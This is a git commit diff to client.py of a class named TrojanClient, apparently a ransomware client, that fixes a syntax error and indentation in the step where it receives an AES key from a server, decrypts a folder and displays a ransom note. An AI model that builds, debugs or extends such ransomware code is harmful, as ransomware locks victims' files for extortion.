04e3062b7ae7d9ecbf6ecdcf3af09312d2db8362
GalH69 <auto.install@cs.com>
2026-01-31 16:04:41 +0200

    'autosave'

--- client.py
+++ client.py
@@ -146,12 +146,13 @@ class TrojanClient:
         msg = protocol.receive(self.connection)
         msg_decode = msg.decode()
         if (msg_decode != "sending decryption key"):
-            raise except
+            raise ValueError("unexpected message")
+
         aes_key = protocol.receive(self.connection)
         FileEncryptor.decrypt_folder(self.folder, aes_key)
-            del aes_key
-            RansomNote.display_decryption_note()
-            protocol.send(self.connection, "the files are decrypted")
+        del aes_key
+        RansomNote.display_decryption_note()
+        protocol.send(self.connection, "the files are decrypted")
 
 
 
